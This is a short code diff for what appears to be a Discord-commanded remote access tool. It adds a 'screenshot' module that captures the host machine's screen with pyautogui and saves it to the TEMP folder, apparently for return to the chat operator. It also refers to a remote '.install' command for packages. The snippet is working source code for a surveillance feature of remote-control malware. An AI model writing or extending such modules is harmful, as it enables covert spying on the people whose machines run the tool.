@@ -3,13 +3,16 @@
 # ----------------------
 # TODO:
 # -screenshot
-
+def get_dependencies():
+    return """
+import pyautogui
+"""
 def get_code():
     return """
+
     # ADDED SCREENSHOT MODULE
     elif message.content.lower().startswith("screenshot"):
         try:
-            import pyautogui
             screenshot = pyautogui.screenshot()
             path = os.path.join(os.getenv("TEMP"), "screenshot.png")
             screenshot.save(path)
@@ -20,4 +23,5 @@ def get_code():
         except ImportError:
             await message.channel.send("pyautogui is not installed. Please install it using `.install pyautogui`.")
             return
-          """
+
+"""
